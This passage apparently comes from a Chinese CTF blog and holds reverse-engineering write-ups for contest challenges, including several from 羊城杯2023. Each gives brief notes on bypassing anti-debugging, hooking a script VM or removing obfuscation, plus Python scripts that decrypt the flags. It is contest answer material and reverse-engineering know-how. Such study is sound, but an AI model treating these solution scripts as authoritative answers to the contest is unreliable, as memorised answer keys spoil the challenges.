<h6 id="贴一下re吧其实题有点难的但是为啥那么多解呢还是我太菜了嘛55555"><a class="markdownIt-Anchor" href="#贴一下re吧其实题有点难的但是为啥那么多解呢还是我太菜了嘛55555">#</a> 贴一下 re 吧，其实题有点难的（<s>但是为啥那么多解呢，还是我太菜了嘛 55555</s>）</h6>
<span id="more"></span>
<h3 id="fisher"><a class="markdownIt-Anchor" href="#fisher">#</a> fisher</h3>
<p>前面的没什么用，把反调和格式检查过掉，然后手动改 rip 过 sha1 触发 main 里的异常处理，有一个函数里面有类似 base 变表的表，实则是自写的加密，可以把 vector 容器的符号表恢复一下方便看，逆该加密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encoded_flag = <span class="string">&#x27;N17EHf1DWHD40DWH/f79E05EfIH1E179E1&#x27;</span></span><br><span class="line">decoded_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;ghijklpqrstuvwxyzABCabcDEFdef0123GHI4567JKL+/MNOmnoPQRSXYZ8TUVW9&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1, c2 <span class="keyword">in</span> <span class="built_in">zip</span>(encoded_flag[<span class="number">0</span>::<span class="number">2</span>], encoded_flag[<span class="number">1</span>::<span class="number">2</span>]):</span><br><span class="line">    i1, i2 = table.index(c1), table.index(c2)</span><br><span class="line">    row1, col1 = <span class="built_in">divmod</span>(i1, <span class="number">8</span>)</span><br><span class="line">    row2, col2 = <span class="built_in">divmod</span>(i2, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> row1 != row2 <span class="keyword">and</span> col1 != col2:</span><br><span class="line">        col1, col2 = col2, col1</span><br><span class="line">    <span class="keyword">elif</span> row1 != row2:</span><br><span class="line">        row1, row2 = (row1 + <span class="number">7</span>) % <span class="number">8</span>, (row2 + <span class="number">7</span>) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        col1, col2 = (col1 + <span class="number">7</span>) % <span class="number">8</span>, (col2 + <span class="number">7</span>) % <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    decoded_flag += table[row1 * <span class="number">8</span> + col1] + table[row2 * <span class="number">8</span> + col2]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_flag.replace(<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="fafalua"><a class="markdownIt-Anchor" href="#fafalua">#</a> fafalua</h3>
<p>写作 lua，实则发现是 AngelScript 语言的玩意，找到官方仓库看源码，发现 samples 里面有个 games 和这个程序的 games 一模一样，除了游戏过关后多一个输入 check flag，以及.as 被编译为 asc，后缀改成 flua</p>
<p>游戏本身没有用，改 zf 过掉即可</p>
<p>然后会输入，输入的 flag 会过一个 gift，映射一下</p>
<p>打入符号表，asCContext::ExecuteNext 函数会执行 asc 的 opcode，这里猜测加密逻辑均在该函数中执行（调试非 asc 程序时会发现直接返回 no~ 并打印）</p>
<p>直接对该函数的 vm 分发进行批量 hook，会发现一直在执行这部分的 xor，hook 并打印，</p>
<p>经过调试发现这里只做了 xor，发现在对 flag 处理中不会触发其他 xor，且 xor 数量刚好为输入长度两倍</p>
<p>第一次 xor 中内存里看见 deadbeef 字符串，经过调试以及猜测发现是 rc4</p>
<p>然后跟进调试 hook，发现了另一个置换异或操作，数量恰好为 0x26</p>
<p>均打印 hook 结果分析，猜测加密逻辑</p>
<p>得到解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(get_reg_value(&#x27;edx&#x27;),&quot; ^ &quot;,idc.get_wide_word(get_reg_value(&#x27;rax&#x27;)),&#x27; = &#x27;,get_reg_value(&#x27;edx&#x27;) ^ idc.get_wide_word(get_reg_value(&#x27;rax&#x27;)))</span></span><br><span class="line"></span><br><span class="line">enc_idx = [<span class="number">0x27</span>, <span class="number">0xfd</span>, <span class="number">0x94</span>, <span class="number">0x28</span>, <span class="number">0x97</span>, <span class="number">0x7d</span>, <span class="number">0xcb</span>, <span class="number">0xd3</span>, <span class="number">0x31</span>, <span class="number">0xdd</span>, <span class="number">0xe</span>, <span class="number">0xcc</span>, <span class="number">0x97</span>, <span class="number">0xc9</span>, <span class="number">0xa8</span>, <span class="number">0x5</span>, <span class="number">0xae</span>, <span class="number">0xaf</span>, <span class="number">0x61</span>, <span class="number">0xd0</span>, <span class="number">0x88</span>, <span class="number">0xf8</span>, <span class="number">0xd7</span>, <span class="number">0xee</span>, <span class="number">0x16</span>, <span class="number">0x36</span>, <span class="number">0x67</span>, <span class="number">0x3a</span>, <span class="number">0x8c</span>, <span class="number">0x35</span>, <span class="number">0x97</span>, <span class="number">0x2c</span>, <span class="number">0x22</span>, <span class="number">0x17</span>, <span class="number">0xdd</span>, <span class="number">0xef</span>, <span class="number">0x9a</span>, <span class="number">0x96</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x25</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    enc_idx[i] ^= enc_idx[<span class="number">0x26</span> - i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">table1 = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> enc_idx:</span><br><span class="line">    enc.append(table1.index(b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4 = ARC4.new(key=<span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">dec = rc4.decrypt(<span class="built_in">bytes</span>(enc)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">table3 = [<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3E</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3F</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xDF</span>, <span class="number">0x1E</span>, <span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> dec:</span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">in</span> table2:</span><br><span class="line">        flag += <span class="built_in">chr</span>(table3.index(table2.index(m)))</span><br><span class="line">        <span class="comment"># flag += m</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>羊城杯2023</title>
    <url>/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/</url>
    <content><![CDATA[<h6 id="preface-尽力了吧re这边剩下俩题都是一解赛中肯定没时间做了最近忙完来复现"><a class="markdownIt-Anchor" href="#preface-尽力了吧re这边剩下俩题都是一解赛中肯定没时间做了最近忙完来复现">#</a> preface: 尽力了吧，re 这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现</h6>
<h6 id="9-22babyobfu混淆去掉了加密不太能搞懂主要是不想调了调着patch一次真有点精神污染"><a class="markdownIt-Anchor" href="#9-22babyobfu混淆去掉了加密不太能搞懂主要是不想调了调着patch一次真有点精神污染">#</a> 9-22：babyobfu 混淆去掉了，加密不太能搞懂，主要是不想调了，调着 patch 一次真有点精神污染</h6>
<h6 id="10-11还是回来做了搞定了算"><a class="markdownIt-Anchor" href="#10-11还是回来做了搞定了算">#</a> 10-11：还是回来做了，搞定了算</h6>
<span id="more"></span>
<h3 id="ez加密器"><a class="markdownIt-Anchor" href="#ez加密器">#</a> Ez 加密器</h3>
<p>调一下发现输入六位秘钥（注意是全数字），base64 变表成八位做 DES 秘钥<br>
爆破六位即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_decrypt</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_encode</span>(<span class="params">s, custom_table</span>):</span><br><span class="line">    std_base64_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    encoded = base64.b64encode(s).decode()</span><br><span class="line">    custom_encoded = <span class="string">&quot;&quot;</span>.join([custom_table[std_base64_table.index(c)] <span class="keyword">for</span> c <span class="keyword">in</span> encoded])</span><br><span class="line">    <span class="keyword">return</span> custom_encoded[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&quot;</span>)</span><br><span class="line">    charset = string.digits + <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">6</span>):</span><br><span class="line">            plaintext = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">            key = custom_base64_encode(plaintext.encode(), <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span>)</span><br><span class="line"></span><br><span class="line">            decrypted = des_decrypt(key.encode(), ciphertext)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">for</span> b <span class="keyword">in</span> decrypted):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Possible match: <span class="subst">&#123;decrypted.decode(<span class="string">&#x27;ascii&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">            f.write(<span class="built_in">str</span>(decrypted) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            f.write(<span class="built_in">str</span>(key)) <span class="comment">#file中搜字符串即可</span></span><br><span class="line">    <span class="comment"># if decrypted.startswith(b&quot;flag&quot;) or decrypted.startswith(&quot;DASC&quot;):</span></span><br><span class="line">    <span class="comment">#     print(f&quot;Possible match: &#123;decrypted_text&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;Key: &#123;key&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="blast"><a class="markdownIt-Anchor" href="#blast">#</a> Blast</h3>
<p>比较像 Bogus Control Flow，网上脚本去不太干净，把 jump $5 给 nop 掉之类的手动修修可以 angr 脚本恢复 main，程序有 md5 的特征，动调发现比对的地方是 flag 输入的每一位的 md5 (md5 ())，写脚本 map 一下就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">text</span>):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_table</span>():</span><br><span class="line">    char_to_md5 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        char = <span class="built_in">chr</span>(i)</span><br><span class="line">        md5_hash = generate_md5(generate_md5(char))</span><br><span class="line">        char_to_md5[char] = md5_hash</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> char_to_md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    char_to_md5 = generate_table()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;Character | Double MD5 Hash&quot;)</span></span><br><span class="line">    <span class="comment"># print(&quot;---------------------------&quot;)</span></span><br><span class="line">    <span class="comment"># for char, md5_hash in char_to_md5.items():</span></span><br><span class="line">    <span class="comment">#     print(f&quot;&#123;repr(char)&#125;      | &#123;md5_hash&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    a = [<span class="string">&#x27;14d89c38cd0fb23a14be2798d449c182&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;b5d2099e49bdb07b8176dff5e23b3c14&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ac49073a7165f41c57eb2c1806a7092e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;557460d317ae874c924e9be336a83cbe&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9203d8a26e241e63e4b35b3527440998&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;f91b2663febba8a884487f7de5e1d249&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;488c428cd4a8d916deee7c1613c8b2fd&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;45cf8ddfae1d78741d8f1c622689e4af&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;37327bb06c83cb29cefde1963ea588aa&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;23e65a679105b85c5dc7034fded4fb5f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,]</span><br><span class="line">    <span class="keyword">for</span> query_hash <span class="keyword">in</span> a:</span><br><span class="line">        found_char = [char <span class="keyword">for</span> char, md5_hash <span class="keyword">in</span> char_to_md5.items() <span class="keyword">if</span> md5_hash == query_hash]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(found_char[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="vm_wo"><a class="markdownIt-Anchor" href="#vm_wo">#</a> vm_wo</h3>
<p>转化提取一下 opcode，模拟流程，单字节加密直接映射回去就行</p>
